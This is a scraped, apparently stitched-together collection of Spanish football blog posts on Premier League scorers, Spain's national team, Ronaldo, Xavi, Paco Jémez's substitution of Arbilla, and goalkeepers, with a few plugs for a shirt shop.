tipo que esnifa una línea del cesped y proclama su solidaridad con los estibadores del puerto durante un partido sólo puede merecer mi admiración eterna. Siempre me pareció infinitamente mejor que Michael Owen y sus 163 tantos dejan patente su calidad.5. Les Ferdinand 150 goles para el Queens Park Rangers, Newcastle, Tottenham, West Ham, Leicester y Bolton. Cabeceador extremadamente fiable, el primo de Rio Ferdinand se hizo un hueco en la historia por ser el primer futbolista en hacer goles para 6 equipos diferentes de la Premier League.6. Michael Owen. 147 para el Liverpool, principalmente y el Newcastle United. El niño mimado de la prensa británica fue un auténtico rompe récords tanto en clubes como en la selección, aunque sus últimos años han dejado mucho que desear principalmente por su tendencia a romperse y el lamentable cambio de chaqueta que protagonizó al fichar por el Manchester United.7. Teddy Sherringham. 150 goles. Nottingham Forrest, Tottenham, Manchester United, Portsmouth y West Ham. Un clásico con su pinta de guiri abocado al chiringuito ibicenco. Tan sólo le faltaban las chanclas con calcetines blancos. Casi leyenda.8. Frank Lampard 129 goles entre el West Ham United y el Chelsea. Algunos dicen que es un cañonero con más pegada que juego, otros recordamos que es el centrocampista más goleador de la historia Premier. Una leyenda en vida.9. Jimmy Floyd Hasselbaink. 127 anotaciones para el Leeds United, Chelsea y el Middlesbrough. Vivio una de las últimas épocas buenas del Leeds y ganó la Copa con el Boro. Jugador potente y letal. Pichichi Hasselbaink cantanba el Frente Atlético en el Vicente Calderón cuando la agarraba el de Surinam. No se equivocaban.10. Dwight Yorke. Aston Villa, Manchester United, Blackburn Rovers, Birmingham y Sunderland. 123 tantos para un futbolista infravalorado que formó dupla letal con Andy Cole y que ha acabado reconvertido en mediocentro organizador. El de Trinidad se retiró en el Sunderland cuando aun podía convertirse, a base de retrasar el área de acción, en el Loren negro.Completan la lista: Robbie Keane (121), Nicolas Anelka (116), Ian Wright (113), Dion Dublin (111), Emile Heskey (106), Wayne Rooney (106), Ryan Giggs (103), Matt Le Tissier (101) y Paul Scholes (101). Cuando Puyol machacó contra la red aquel balón en la semifinal sudafricana, recordé aquí mismo el voceo gutural de Juanito cada vez que Martín Vázquez agarraba la pelota en aquellas retransmisiones que nos mostraban palmando invariablemente. ¡Vamos Rafa, eso es medio gol! , empujaba Juan Gómez desde las entrañas. Lo recordaba con la nostalgia alegre que suponía habernos librado del fútbol a martillazos y las lágrimas indisimuladas frente al televisor.Este fin de semana los merengues tienen un partido difícil contra el regular Valencia. Un equipo, el de Emery, siempre luchador y puntualmente brillante. A la sombra de los dos “grandes” pero con entidad suficiente para poner en peligros a cualquiera. El parón de las selecciones ha creado hambre de liga doméstica. El Madrid, con su fútbol directo, con su deconstrucción armónica, merece esa expectación tras años de extravío. Aficionados y contra-aficionados deberían coincidir en que nuestro fútbol necesitaba una alternativa sólida al festín de títulos y fútbol del ya inolvidable ciclo blaugrana. Dos niños corretean alrededor de las mesas de la terraza de un bar una tarde de domingo. Sus padres conversan tranquilamente con otra pareja, disfrutando de un gintonic con una pinta estupenda. Yo estoy tranquilamente leyendo en una mesa cercana, con un café solo aún intacto, esperando a que se enfríe un poco para tomármelo. Los niños giran alrededor de mi mesa y otras mesas, gritando y enrojecidos por el esfuerzo y la emoción del juego. Ya se han tropezado dos veces contra el camarero, que los mira con desesperación. Los padres siguen departiendo animadamente. Uno de los pequeños tropieza con la pata de mi silla y para evitar caerse al suelo se apoya en la mesa, derramando mi café, tirando el vaso de agua a medias y alertando a todos los que allí estábamos por sus risas y el ruido. Le ayudo a recomponerse un poco. La madre se acerca al niño, me pide disculpas aceleradamente y le dice con tono impostado: “ten cuidadito o la próxima vez te siento en la mesa y no te levantas”.Porque en la lista de jugadores que Vicente se lleva a Brasil no sobra nadie, pero sí parece faltar alguno. O algún perfil determinado, para ser más precisos. El abrazo al estilo ya conocido es indudable, innegociable y peligrosamente inequívoco. La lista española acumula jugadores por el carril central y desprecia las alas, con una ausencia (aunque justificada en algunos casos, eso sí) preocupante de jugadores de desborde y profundidad, de futbolistas capaces de romper en velocidad y de colgar centros al área rival. Pudo haber sido Gerard Deulofeu, citado en último momento para el amistoso ante Bolivia de la pasada semana, pero el catalán, que hubiese supuesto una solución insólita y muy especializada, se quedó con la miel en los labios en una decisión radicalmente delbosquiana.La consecuencia lógica a esa ausencia de futbolistas de banda, desborde y centro al área, es la caída en el olvido de Fernando Llorente, protagonista de un notable primer año en el calcio. Sin balones colgados al área, ni siquiera como recurso de emergencia, la presencia del delantero riojano se antoja menos útil que la de otros atacantes de mayor movilidad, como los sí citados Torres, Villa o Costa, futbolistas de movilidad y asociación poco dados a hacer buenos los balones laterales y a dar opciones a segundas jugadas. Lo que sí parece es que la novedad de la presencia de Diego Costa, impensable hace apenas un año y hoy probablemente el número uno en la terna de atacantes españoles, condena la práctica del ‘falso nueve’, variante táctica indispensable en la hoja de ruta de la pasada Eurocopa.Con plan B o sin él, con alternativa a la acumulación de centrocampistas en la zona de tres cuartos del campo o no, la gran duda de España viene apuntada por el desgaste acumulado por los nuestros en una temporada particularmente dura y exigente. Personalmente, no me preocupan tanto las posibles variantes tácticas practicadas por Del Bosque como el cansancio con el que nuestros principales puntales puedan llegar el próximo viernes a Salvador de Bahía. Empecemos a acostumbrarnos a que los que tienen que preocuparse por cómo jugamos, por si planteamos alternativas o por si acumulamos centrocampistas de toque son los demás. Hay algo extraño en eso de las filias y las fobias futbolísticas. Que uno siente cariño o simpatía por equipos a los que aparentemente nada le une, lo mismo que detesta a otros sin un motivo concreto. Simplemente porque sí o por razones que la memoria se ha empeñado en enterrar. Porque cuando uno mira los resultados de la jornada de la liga, digamos, danesa se alegra si el Aarhus (cuidado, en las tablas lo veréis como AGF)ha ganado su partido, pero contiene una mueca de asco (por el qué dirán, más que nada) si ve como el cargante Brøndby ha vuelto a golear y sigue disparado hacia el título de la Superliga. Algo similar ocurre si la clasificación que se ojea es la griega, la de la Championship inglesa (oh, Dios, ha vuelto a caer el Forest…) o la del Grupo VIII de Tercera división. El proceder es exacto.Admito que mis filias y fobias futbolísticas tienen mucho de irracional. Que la mayoría de las veces no existe un argumento razonado de peso a través del que pueda explicar mis querencias por uno u otro equipo. Y me siento profundamente incómodo cuando alguien me pregunta en la pachanga de los jueves acerca de por qué me ha dado por ir a jugar con una camiseta del Aberdeen, porque realmente no existe ningún motivo que pueda ser explicado y, sobre todo, entendido. O, peor aún, cuando entre las habituales risotadas del vestuario notas como alguien te observa con extrañeza mientras te colocas cuidadosamente esa joya del Boavista y te termina preguntando, entre incrédulo y socarrón: ¿qué equipo es ese? . Me avergüenza reconocer mis rarezas en público y tratar de hacer entender a alguien a quien le va a sonar a chino que un simple paseo al atardecer por la Avenida da Boavista de Oporto puede ser motivo suficiente para rendirte al decadente encanto del equipo ajedrezado. No es uno de esos placeres culpables de los que uno disfruta conocedor de que está haciendo algo reprochable, simplemente es algo que no me apetece compartir con nadie, ni siquiera con los allegados.Tengo casi treinta y siete años, lo cual implica de manera objetiva e indubitable que hace tiempo que dejé atrás las fantasías de la niñez. O mejor dicho, que debí haberlas dejado atrás, aunque me resista a ello. Creo que ya lo he comentado alguna otra vez, pero los partidillos entre amigos son el mejor refugio de la infancia que un aficionado al fútbol puede permitirse a partir de cierta edad. El escenario ideal y secreto en el que, por espacio de una hora y media, uno puede dejar de ser quien es y de disfrazarse de quien no es pero le hubiese gustado ser. Con sus filias, con sus fobias. Sin dar explicaciones a nadie. ¿No has sucumbido aún a la tentación de Classic Football Shirts? Un consejo: visita su sección de liquidaciones y oportunidades. Te costará salir de allí sin mandar algo a la cesta de la compra. Portugal rezuma melancolía. Lo hace como país, lo hace como sociedad, y lo continua haciendo como selección nacional de fútbol, en un claro reflejo de lo que la realidad cotidiana del país transmite. Portugal vive anclado en una época pasada, que probablemente fuese muy floreciente pero que a día de hoy se ha quedado románticamente desfasada. Portugal fluye lenta, pausada, como arrastrada por la melancólica cadencia de un fado. Futbolísticamente, el escenario no ha cambiado en demasía con respecto a lo que había hace tres décadas. Las diferencias entre los (muy) ricos y la clase media continuan siendo abismales, de tal modo que la clase media acaba pareciendo directamente baja. Las bicicletas desvencijadas compartiendo calzada con los Ferraris al sol de Estoril.Y una idea similar debe rondar la cabeza de Cristiano Ronaldo cada vez que, pleno de orgullo patrio, le toca enfundarse la elástica de las cinco quinas. El panorama no es precisamente alentador cuando compartes frente de ataque con Hélder Postiga, Hugo Almeida, Éder o Silvestre Varela. Voluntariosos y chispeantes en ocasiones, sí, pero una bicicleta oxidada al lado del Ferrari. Y eso se desprende de la actitud del atacante de Madeira cuando viste la nacional, porque eso es lo que transmite hacia fuera con su inequívoca rabia y frustración, con su aparente enfado con el universo por haberle recluido, a él, ganador irreductible, en el seno de una selección nacional menor. La pelea de Cristiano no es tanto contra el rival de turno como contra sí mismo y su, aparente, desdicha.Se espera más de un futbolista como Ronaldo. Se espera que no desfallezca, que no se deje llevar al verse privado del acompañamiento que cree merecer. Que transforme esa frustración que no se esfuerza en disimular en orgullo y pasión, en suma. No es un recién llegado. No es un jovencito con todo por delante y al que se le deban perdonar los pecadillos de juventud. Cristiano Ronaldo es el mejor futbolista del planeta en dos mil trece y está en el punto álgido de su carrera deportiva. Con veintinueve años debería de tener plenamente asumida su situación en el combinado luso como pieza indispensable e ineludible en el mismo y tratar de dominar esa angustia que tanto lastra y condiciona su juego. Portugal lo sigue teniendo en chino en las horas previas a medirse a Ghana. Cristiano sigue contagiado de la melancolía. ‘Los principales artífices de este cambio considerable son exclusivamente los futbolistas, por sus ganas de revertir situaciones adversas‘. Pizzi lo ha visto tan claro como todos los que hemos podido disfrutar de los dos partidos disputados por su Valencia CF en los apenas diez días que el técnico argentino lleva en Mestalla, un tiempo a todas luces insuficiente para conseguir implantar la más mínima novedad táctica en su nuevo equipo. En la misma línea se pronunciaba Javi Fuego. El mediocentro asturiano ha admitido que tras el trabajado y meritorio empate a uno de su equipo ante el Atlético de Madrid se escondía un cambio de actitud en una plantilla que, hasta la fecha, había pecado de indolencia y a la que le había venido bien el estímulo que siempre supone la llegada de un nuevo entrenador.Y me parece, sin ser ni mucho menos seguidor valencianista, indignante.El cambio radical de actitud en la plantilla del Valencia encierra un comportamiento mezquino.La transformación de algunos futbolistas en concreto ha sido bochornosa. De futbolistas menores, pusilánimes, ausentes y pacatos al servicio de Djukic, a corajudos, voluntariosos y esforzados peones de Pizzi. El caso concreto de Feghouli, inestable jugador de indudable calidad técnica pero fugaz compromiso, es particularmente sangrante. Pero no es el único que ha redoblado la intensidad de su esfuerzo con la llegada del nuevo técnico.Es comprensible que la nueva situación en el banquillo de Mestalla haya supuesto un estímulo en los futbolistas y que haya despertado en ellos un interés renovado en causar la mejor impresión posible a su nuevo entrenador. Es casi como partir de cero, como volver a ganarse el respeto, la confianza y, en definitiva, el sitio. Como lavativa, como proceso depurativo y como desinfectante de una situación emponzoñada ya hasta el extremo, el flagrante cambio de actitud puede ser bien entendido y recibido. Como reacción de un grupo de profesionales al servicio de una entidad y como decisión traicionera y cobarde para con su exentrenador resulta de todo punto inadmisible. Algo ha pasado que, de repente, llegó el día en el que nos sorprendimos de ver a Xavi Hernández en el once titular del Barça en un partido de Liga de Campeones. ¡Eh! ¡Que saca a Xavi y deja fuera a Rakitic! Tal vez es que hubo un momento, dos meses atrás, en el que vimos al centrocampista egarense más fuera que dentro del club. O quizá es que, pese al empecinamiento de Martino en aferrarse a la simbología tradicional del barcelonismo para intentar así salir a flote en mitad de la marejada, se intuyesen muchos motivos para su progresiva desaparición del equipo ya durante el pasado curso. El caso es que no resultó demasiado costoso habituarse a sus ausencias y dar por sentado que este Barça de las ciento y una caras nuevas ya no pasaba inevitablemente por sus pies y su cabeza.No había dudas sobre Luis Enrique y su encomendada labor de saneamiento de un equipo viciado y con los mecanismos olvidados. Ingrata tarea.El niño sigue corriendo entre las mesas sin escuchar apenas la tímida regañina de su madre. El padre desde su silla mira al pequeño casi con satisfacción, cómplice de su alboroto. Yo pido otro café  y la madre vuelve a su gintonic. “Sólo son niños”, dice una señora a mi lado. Bajo la mirada al libro y sigo leyendo.La idea del castigo nos trae reminiscencias oscuras, algo prejuiciosas. He pasado mis tres últimos años trabajando como monitor en un proyecto de Servicios Sociales con menores en riesgo de exclusión. Una de las más importantes conclusiones extraídas de mi experiencia es que no existe mejora sin responsabilidad, que toda consecuencia sucede a una acción y que en nuestra mano está elegir qué acciones son las correctas, las deseables y las que armonizan con el resto del grupo. En estos años me he visto en la obligación de castigar a algunos de esos niños. No a reforzar negativamente, no a parrafadas diciendo lo mal que lo ha hecho. Hablo de castigar, de privar de algo, de tomar una decisión delante de sus compañeros y amigos que deje claro que lo que ha hecho está mal y que el castigo es proporcional a su acto indisciplinado o perjudicial. No me sentí culpable ni cruel, me parecía parte de mi labor como educador y responsable del grupo. Centrándonos en el fútbol con un ejemplo de castigo: apartar del partido de fútbol a un menor por llamar “hijo de puta” a otro, por pervertir los valores del juego, por no saber respetar a los compañeros. Expulsarle de la diversión pese a sus ruegos por el bien del equipo, del grupo y de los valores que tratábamos de mostrarle.Ayer Arbilla falló clamorosamente un pase propiciando el gol de Messi en el partido que enfrentó al Barcelona contra el Rayo Vallecano. Cinco minutos después su entrenador, Paco Jémez, lo cambió. Quedaban sólo tres minutos para el descanso pero el entrenador cordobés no esperó, quiso hacerlo así, delante de todo el estadio, delante de sus compañeros y rivales. Señaló al defensa y lo cambió. Hoy leo la palabra “humillación” por todas partes. Leo que la reacción de Jémez fue “inapropiada”, incluso “injusta”. Y pienso en los niños correteando alrededor de las mesas en el bar. Hay momentos en el que el entrenador debe tomar decisiones, debe marcar el límite de sus responsabilidades. Un castigo no es una humillación si es proporcional al error, si es consecuencia de una perversión de los valores que se establecen de antemano, si es producto de una acción premeditada y perjudicial para el resto. Un castigo es la consecuencia justa de un comportamiento negativo y evitable. Lo de Arbilla no fue sólo el pase errado, también su reacción templada, su trote desganado para deshacer el entuerto. Su error recayó en todo el grupo, su fallo hundió a los compañeros, desmontó su esfuerzo, supuso un peldaño hacia abajo en su consecución de la victoria. Es de mojigatos ponernos de parte del castigado, como lo sería en el ejemplo anterior darle la razón al niño que llama “hijo puta” a un compañero. Que sus lágrimas en el vestuario o su cara de lástima no nos disuadan de una decisión meditada y lógica.Un entrenador tiene la obligación de “educar” a la plantilla. De transmitir unos valores, una motivación y un objetivo que haga removerse el ánimo de los jugadores. Cualquier comportamiento en el grupo que contrarreste esos valores debe ser puesto sobre la picota y enjuiciado ante el resto. Sólo así puede el grupo avanzar unido, solidario y fuerte. Entra ahí el concepto de resiliencia. La resiliencia se define como la capacidad del individuo para asumir con cierta flexibilidad las situaciones difíciles. Cuanto mejor aguantes los golpes que te da la vida, más firme serás en tus convicciones y resistente a las inclemencias de la existencia. Para un jugador de fútbol profesional, la situación de Arbilla debe ser un espaldarazo más, un aprendizaje, un motivo para seguir creciendo. El castigo no es hundir, el castigo es una forma de reforzar el carácter, de luchar para hacerlo mejor. Por ahí van los tiros con Jémez. Él no quiere finiquitar a su jugador, faltaría más que a mitad de curso decidiera desprenderse de un defensa importante en su once. Lo que el entrenador pretende es que Arbilla mejore, que lo de todo, que con su toque de atención sepa que lo ha hecho mal, que hay un camino correcto en sus actos y que en el siguiente partido confía en él sobre todas las cosas. Que este partido, que este acto innoble, le sirva como punto de inflexión. Que no vuelva a pasar. Hoy es un 6-0 contra el Barcelona pero mañana puede ser un partido a vida o muerte para salvar la categoría y el error sería aún más catastrófico.Cuando la madre no riñó a su niño por tirarme el café pensé en que esa misma tarde volvería a empujar otra mesa, y mañana, y pasado. Y el problema no es el café, ni el juego, ni el ruido. El problema es que esos niños nunca aprenderán lo que es el respeto a los demás, lo que significa apreciar el espacio del resto de la gente. La vida será un todo vale, un absurdo libre albedrío. Los mismos que hoy dicen que la decisión de Jémez es humillante después dicen que el problema de Balotelli es que nunca nadie lo metió en vereda. Los mismos que claman contra Jémez por “señalar” a un jugador después celebran el reconocimiento (refuerzo positivo) cuando Del Bosque cambia a Iniesta unos minutos antes del final para que reciba el aplauso del público. Hablamos de la misma cuerda y sólo nos movemos de extremo a extremo. El cambio de Jémez  me pareció adecuado y consecuente con sus valores. Prefiero un entrenador activo, desafiante, motivador que un entrenador apocado y abandonado al talento de los suyos. El fútbol es un poco el día a día: somos libres, pero a cada acción le sucede una consecuencia. Y esa consecuencia a veces nos hace replantearnos el futuro. Se llama educación y es una parte fundamental de nuestras vidas. Viendo los resúmenes de la última jornada europea pensé en los buenos porteros que tiene España. Belenov contra el Valencia, Helton contra el Atlético, y otros cuantos guardametas con nombres que desconozco defendiendo temerariamente algo tan sagrado como la portería.El pasado viernes salió la lista de Del Bosque y pensé en si la Santísima Trinidad Casillas-Valdés-Reina se ajustaba al momento de forma que viven nuestros porteros y pensé en alternativas. Con Casillas no soy objetivo. Llevo años diciendo en este blog –con sus consecuentes insultos hacia mi idea- que Valdés es mejor portero que Casillas.Hoy vuelvo a los berridos de Juan Gómez, siempre me ocurre con las cosas de la selección. Y lo hago la emoción contenida por el cinismo que dan los años pero con un nudo mayor en la garganta. Porque el flashback con España siempre te devuelve a la realidad con heridas y pensar en Juanito alentando una jugada desesperada ahora que hemos descarrilado me da escalofríos. Por eso, porque hemos tragado tanta mierda hasta que llegaron Del Bosque, Casillas, Iniesta y compañía, recordar ciertas imágenes solo provoca el agradecimiento sincero hacia estos futbolistas.Enhorabuena a los genios de la táctica, a los estudiosos del ánimo, a los pulpos psíquicos, los arquitectos de convocatorias, las eminencias de la preparación física y a la camada de iluminados que llevan años anticipando el desastre mientras se entretienen en lanzarle dardos torpes a una diana con bigote. Un saludo a esa yihad absurda y una frase de mi amigo Ramón Flores para resumir lo suyo: vistos los cojones al mono, era macho.España ha sido un indiscutible desastre en Brasil, desde el primer hasta el último símbolo. Desde Casillas, que se ha esforzado en maltratar su aureola de santo con varios revolcones inusitados, al propio Del Bosque. Piqué, Xavi, Ramos… El funeral que captaron las cámaras en el túnel de vestuarios cuando tan solo íbamos por la mitad del escarnio chileno fue de los que te congelan el corazón. Un plano definitivo.Y así nos vamos del Mundial, sin un fade out dulce que hile una canción con otra. Estoy seguro de que llegarán otras con las que emocionarse, pero esta España se ha ido de sopetón. Como cuando ibas escuchando el walkman y se te acababa la cara de aquella cinta grabada torpemente. España nos ha rejuvenecido, lo de ayer fue una vuelta a la infancia en toda regla. Volvimos al puto walkman y sinceramente, no nos hacía falta. Soy nostálgico pero no idiota, ni echo de menos las cintas ni compartir agonía con Juanito por algo que nunca acababa de llegar. Por todo eso, gracias señores. Rematando con la solvencia acostumbrada el buen trabajo comenzado en Stamford Bridge, el Manchester United facturó la maleta hacia una de las semifinales de esta Liga de Campeones y ya espera rival. Seguramente alemán. Marcaron Chicharito Hernández, instinto en modo arcade y Park pero los tantos volvieron a gestarse en la cocina de Ryan Giggs. Nani revuelve y Rooney intimida pero el que guisa es Giggs. El genio académico puso en bandeja los dos tantos locales y a la grada en pie. Como tantas otras tardes. El gol azul, el que empató la contienda y aplicó la respiración asistida al muerto durante un minuto, fue de Didier Drogba que entró en el segundo acto para enmendarle la plana a un inocuo Fernando Torres. No alcanzó pero si al Chelsea le iluminó la luz en algún momento fue por el resquicio que arañó el marfileño.Puro estándar inglés desde el arranque, mucho ritmo y pocas nueces, el encuentro avanzó sin correa hasta la media hora. Ahí, tras un amago que solo truncaron un par de centímetros de carne en orsay, golpeó el United. Entre O’Shea y Ryan Giggs pintaron un cuadradito por la derecha y allí el galés se sintió tan cómodo que aprovechó para habilitar con finura a Javier Hernández. El mexicano tan rápido, incisivo y quirúrgico como siempre, trocó el regalo en gol con la cabeza. One nil y la eliminatoria se le iba por el sumidero a un Chelsea tan impetuoso como romo en ataque. Por el contrario el United, sin apenar tener que agacharse, había vuelto a encontrar una moneda flotando y ante sus propias narices.Es cierto que tras el descanso, con Torres ya en el banquillo, el Chelsea creció y acogotó por momentos al local. Con la gracilidad y sofisticación de un Wimbledon, motores como el expulsado Ramires valen para ello, pero de modo igualmente efectivo hasta pescar premio en la resolución de Drogba. Y pensó que podía el cuadro capitalino en el intercambio de golpes pero un minuto más tarde llegó el guantazo de Park (de nuevo Giggs en el pase y con ese sumaba tres de gol en toda la eliminatoria), la lona y el billete de vuelta a Londres. El Manchester United ofició de verdugo (2008 en la memoria) y de heraldo de un cambio de ciclo necesario y más que probable en Stamford Bridge. Al otro lado, Ferguson y compañía se plantan en la que ya es su casa, cuatro semifinales en cinco años, para llamar a la puerta del título. Llega la navidad y toca avanzar a través de trincheras aturronadas, luces puñeteras, niños cantores y hordas de desocupados dispuestos a acampar en el centro de la ciudad durante horas con tal de gastarse el subsidio en lotería. Tradiciones, un asco la mayoría. Sin embargo siempre me ha gustado saltarme el prejuicio y echarle un ojo al mercado de fichajes invernal. ¿Cuantos jugadores será capaz de olisquear el Manchester City en una semana? . ¿Reconoceré a algún futbolista del Zaragoza a partir del próximo mes? ¿Se ofrecerá Diego Armando Maradona para entrenar a mi equipo de fútbol siete? Me encanta desperdiciar las vacaciones en ir encontrándoles respuesta a estas preguntas. Y hay una muy buena ¿Cambiará de equipo Robbie Keane por enésima vez?Informan en el Telegraph de que el delantero podría hacer un hueco en su abundante vestidor para una nueva camiseta a partir de enero y añadir la del West Ham a las del Wolverhampton, Coventry, Inter, Leeds, Tottenham Hotspur, Liverpool y Celtic. El Tottenham le cedería por seis meses, Harry Redknapp más que objeciones pondría el lazo, y el United se reservaría una opción de compra en el improbable caso de que el baqueteado irlandés fuera el delantero centro que solucione los problemas que llevan desesperando a la parroquia de Upton Park desde hace dos años. Apuesto a que besa el escudo de los martillos nada más llegar y nos espeta que moría por formar parte del club desde que era un niño. ¿Por qué no? No sería ni la primera ni la segunda vez que lo hace…Suena a fichaje sencillo y teniendo en cuenta el historial reciente del club posiblemente se consume. En los dos últimos años el aficionado hammer ha humedecido sus sábanas con la llegada de nueves tan válidos como Gudjohnsen, Chamakh o Luca Toni, Ruud van Nistelrooy o Thierry Henry. Desde la otra punta de la ciudad se escuchaba un murmullo y era el frotar de manos de la hinchada de Upton Park. Lo malo es que los que llegaron al final fueron Diego Tristán, Di Michele, Savio Nsereko, Nouble, Luis Jiménez, Guille Franco, Mido, Ilan, Benni McCarthy, Piquionne y Victor Obinna para lograr entre todos, un once completo de supuestos especialistas, unos apabullantes 24 goles. Robbie Keane vendrá, ojalá me temo, a hacer el doce en la lista de fiascos. Y alguno aun se extraña que un club de la tradición del West Ham se arrastre por la Premier… Buceando por la actualidad del fútbol abisal leo que al entrenador del Chichester City, equipo del que juro no haberme inventado el nombre para la humorada y que juega en la primera división de la liga del condado de Sussex (Inglaterra), le han puesto de patitas en la calle durante el transcurso de un partido del equipo al que entrenaba. “Durante el segundo tiempo recibí la llamada telefónica de Gary Walker, uno de los directivos. Me pidió  disculpas por las molestias y después me dijo que estaba despedido. La  llamada no podía haber llegado en peor momento dado que a uno de mis  jugadores acababan de llevárselo al hospital con la mandíbula, el pómulo y la nariz rotas tras chocar con el portero rival”, declaró Mark Pulton, que así se llama el nuevo parado en una frase que ni los guionistas de The Office, siempre en busca de la risotada por el patetismo, serían capaces de escribir mejor. “Debo de ser el primer entrenador al que echan durante el partido”, dijo el pobrecito. Pero en eso se equivoca e incluso ha habido casos peores.Que se lo digan a Harald Schumacher. El meta alemán, icono indeleble por muchas cosas buenas como su innegable pericia bajo los tres palos y  por alguna barrabasada como las recordadas caricias a Battiston y a Maradona también recibió amables palabras de sus superiores durante el descanso invitándole a que cesara en sus funciones a la mayor brevedad posible. Sin embargo tuvo menos suerte que el míster del Chichester. A Toni Schumacher también le pusieron la maleta en la calle durante el descanso pero de ellos se encargó el presidente en persona .Muchos futbolistas cerrarían la puerta de Can Barça por fuera. Otros, los más afortunados, se verían obligados a redefinir su papel dentro del esquema del equipo para posibilitar el cambio. Lo de Xavi, futbolista a partir del que se había venido definiendo el estilo azulgrana desde hace más de una década, tenía pinta de incómodo compromiso: ¿qué hacer con él una vez decidida su permanencia en el club? ¿Merecía idéntico trato que cualquier otro?Por su indudable influencia dentro del barcelonismo, Xavi podría ser el eslabón ideal entre el pasado y el futuro inmediato. Al menos, hasta que se encuentre un sustituto de garantías que interprete el rol de catalizador del estilo y que, a día de hoy, aún ni siquiera ha exhibido credenciales. Pero no es sencillo pasar de protagonista a secundario y dejar de ser el eje gravitacional del equipo, como no es sencillo tampoco ser el ‘responsable’ de la desaparición del emblema azulgrana. La postura de Luis Enrique se acercaba al ‘vale, permito que Xavi se quede en la plantilla pero cuando lo deje en el banquillo o fuera de la convocatoria no me toquéis los huevos porque no juega‘, porque preveía que la presencia del centrocampista de Terrassa podía llegar a condicionar su trabajo a la hora de diseñar sus alineaciones.Creo firmemente en la importancia, no ya tanto deportiva pero sí ‘espiritual’, de contar con un referente ideológico del calibre de Xavi Hernández a la hora de remangarse la camisa y proceder al saneado del Barça. Su presencia, lejos de suponer un ‘marrón’ para el técnico, debería ser entendida como una ayuda extra y un apoyo dentro del vestuario, como cicerone de los nuevos y como amarre seguro para los más veteranos. Sin Valdés y, sobre todo, sin Puyol, el protagonismo de esa tarea recae casi única y exclusivamente sobre Xavi. Aunque cada vez resulte más sorprendente su presencia en un once inicial.Puedes comprar camisetas de Xavi Hernández en Classic Football Shirts, la tienda online especializada en camisetas de fútbol de clubes de todo el mundo. ‘Siempre dije que Keylor Navas iba a ser el mejor portero de la Liga española‘. De porteros, de la Liga española y del propio Keylor, Luis Gabelo Conejo sabe un rato. El mítico exportero del gran Albacete de principios de la década de los noventa habla con una seguridad pasmosa sobre su compatriota, con el que coincide, como preparador de porteros, en la selección nacional de Costa Rica. Bien, quizá las palabras de Conejo estuvieran algo condicionadas por las circunstancias que le unen al portero del Levante. Es difícil poder afirmar con rotundidad que Keylor sea ‘el mejor’ portero de la Liga, porque es muy complicado establecer una comparación justa y equilibrada entre los distintos candidatos. Sobre lo que hay muchas menos dudas es sobre el excepcional momento de forma del meta costarricense.La fortaleza del Levante de Joaquín Caparrós se fundamenta en un equipo muy bien cohesionado, sin fisuras en su estructura, con una extrema optimización de los escasos recursos disponibles… El ABC del caparrosismo, esa corriente que consigue hacer parecer mejores a los futbolistas a base de explotar al máximo sus virtudes y ocultar sus carencias, parece haber encontrado un hábitat ideal en el escenario de Orriols. Sin desproporcionadas exigencias y siempre bajo la premisa de que el único objetivo es la permanencia en Primera, el Levante suma y sigue abrazado a la figura de su colosal portero.Mucho se ha hablado en los últimos tiempos de la progresión de Keylor.Los títulos internacionales parecen quitarme razón, según los lectores, aunque claro, nunca sabremos si hubiéramos levantado esos títulos con el culé bajo palos, o con cualquier otro. Lo cierto es que Casillas pasó un año con altibajos y Mourinho lo erosionó como a una piedra. Lo de Adán fue un chistecillo portugués sin gracia pero la alternativa de Diego López es real y la suplencia del ídolo de Móstoles es, cuanto menos, debatible. Diego López es el primer portero que se me viene a la cabeza como posible tercer portero de la Selección por delante de Reina.Pepe Reina es un portero notable y creo que el cambio de equipo le ha ayudado a mantener el nivel. No subirlo, porque ya no está en edad de crecer, pero sí de abandonar los tics propios de un portero consolidado en un equipo como el Liverpool. Un Nápoles con pinta de hacer cosas bonitas este año necesita a un portero como Reina. Es bueno por alto, tiene una colocación intachable y da mucha seguridad a los defensas. La mezcla de experiencia y lectura de juego le dan un valor añadido. Cuando pensáis en porteros siempre recordáis sus cantadas. Nada más comprensible pero injusto. En cualquier caso, creo que Reina ya no está para la Selección. El tercer portero debe ser para un portero con proyección.Pienso en De Gea, titular en la espinosa meta del United. Aunque hay otros que pueden una ocupar esa plaza. En un equipo donde va a debutar Alberto Moreno del Sevilla, o lo han hecho Koke o Nacho, también tiene que haber un hueco para jugar con la portería, para llevar a jugadores de futuro. Para que aprendan, sientan y se acostumbren a la presión que rodea al conjunto nacional.Pienso en Guaita mientras escribo esto. Lo vi en directo, en San Mamés, y me apasionó su presencia bajo palos. El Athletic perdió ese día y el valencianista tuvo mucha culpa. Y luego está Valdés, claro. En mi opinión el mejor, a la alargada sombra de Casillas. El Barcelona lo llorará muchas tardes, por más bromas que hayan hecho con él en sus titubeantes comienzos. Es un portero al límite, poco académico quizá por la tendencia al juego de pie que exige su sistema. Pero es frío, impredecible para lo bueno, capaz de definir un partido con sus manos. Es mi favorito, lo confieso, y viendo la que está cayendo, quizá sea el portero más en forma de cara al Mundial de Brasil. Aunque aún es pronto para eso. Y os pregunto: ¿Qué tres porteros llevaríais a la Selección Española? Los míos, por orden de titularidad: Valdés, Casillas, Diego López. Tengo un sueño recurrente. Tengo prisa por salir a la calle porque alguien me espera en el portal. Intento vestirme pero me es imposible. Siempre pasa algo: la ropa está sucia, los zapatos extraviados, no sé ponerme los pantalones, mis compañeros de piso me entretienen o mi madre me llama por teléfono de forma inoportuna. Despierto siempre sin haber conseguido llegar a tiempo, cuando llego al portal ya no me espera nadie. No he buscado qué significa. Pienso en ansiedad, en responsabilidad o en quién sabe qué inconsciencia turbadora freudiana. Ayer, viendo al Córdoba, pensé en mi sueño habitual. En esta pesadilla del no poder llegar nunca al sitio deseado.Cómo le duele el fútbol al Córdoba.De su crecimiento desde que llegó a España para ingresar en las filas del Albacete (precisamente, de la mano de su compatriota Luis Gabelo Conejo) con apenas 23 años, hasta la actualidad, en la que se ha convertido en una de las referencias de un Levante en posiciones europeas. Ya no queda nada de aquel portero discreto y timorato que aguardaba paciente su oportunidad a la sombra de Munúa. El internacional por Costa Rica es hoy un portero de fuerte personalidad, dominador en el área, valiente en los balones colgados y un prodigio de reflejos que en cada partido nos termina dejando dos o tres paradas de antología. Y eso, en un equipo como el Levante, es tener mucho ganado. No fue nada ‘Arsenalesco‘. Nada respondió en el partido de la Community Shield que abría la temporada inglesa el pasado domingo al tradicional guión gunner de la última década. Se plantaron firmes sobre el verde, consiguieron adelantarse con un melonazo de Oxlade y supieron mantener su ventaja con sobrada 